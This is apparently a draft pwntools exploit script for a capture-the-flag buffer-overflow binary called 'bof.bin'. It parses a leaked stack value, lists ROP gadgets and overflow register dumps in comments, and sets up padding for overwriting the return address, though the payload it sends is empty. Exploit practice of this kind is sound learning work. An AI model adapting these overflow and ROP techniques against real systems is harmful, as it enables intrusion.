# =============================================================================

#!/usr/bin/python3
from pwn import *
context.log_level='debug'
import time
# =============================================================================

#   asm volatile("mov $1, %%eax; mov $0x31337, %%edi; mov $0x1337, %%esi; int3" ::: "eax");
#   int secret = 0xdeadbeef;
#   if (secret == 0x67616c66) {
#   5015
#   pop edi; pop ebp; ret
#   7915
#   pop esi; pop ebp; ret
#   5037
#   pop eax; int3; ret
#   0x00001824 : mov eax, dword ptr [esp] ; ret
#   addr = next(binario.search(asm("int3")))
#   0x00001397 : pop edi ; pop ebp ; ret


elf = context.binary = ELF("bof.bin")
libc = elf.libc





# =============================================================================


gs = '''
break main
'''
# 

# =============================================================================


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def setColor():
    io.sendline(color)

# =============================================================================

#  EBX  0x43434343 ('CCCC')
#  EBP  0x44444444 ('DDDD')
#  ESP  0xffffd000 ◂— 'FFFFGGGGHHHHI*4JJJJ'
#  EIP  0x45454545 ('EEEE')
#  0xf7e5f078 : mov eax, ebx ; pop ebx ; ret
#  0xf7df09e8 : mov eax, 1 ; ret
# 0xf7e721f4 : xor eax, eax ; pop edi ; pop esi ; ret

#rop
# 0x00001396: pop esi; pop edi; pop ebp; ret; 
elf.symbols['pop_eax_int3'] = 0x13ad
elf.symbols['pop_esi_edi_ebp'] = 0x1396

exp=""
secret="flag"
pad1=b'A'*48
pad2=b'B'*12
buf=b'C'*4
# exp=pad1+bytes(secret,'utf-8')+pad2
# =============================================================================


io = start()
io.recvuntil('Do you want color in the visualization? (Y/n)')
# print('*'*80)
# time.sleep(0.25)
io.sendline('n')
time.sleep(1)
# print(io.recvuntil('Input some text: '))
leak=io.recvuntil('Input some text: ')
# time.sleep(1)
leak=leak.decode("utf-8")
# time.sleep(1)
leak=leak.split('\n')[-3][13:-2]
# time.sleep(1)
leak=leak.split(' ')[::-1]
# time.sleep(1)



# io.sendline("a")
strleak=""

for i in range(4,len(leak)):
    strleak+=leak[i]
leak=int("0x"+strleak,16)


io.sendline(exp)


io.stream()

# =============================================================================



# =============================================================================


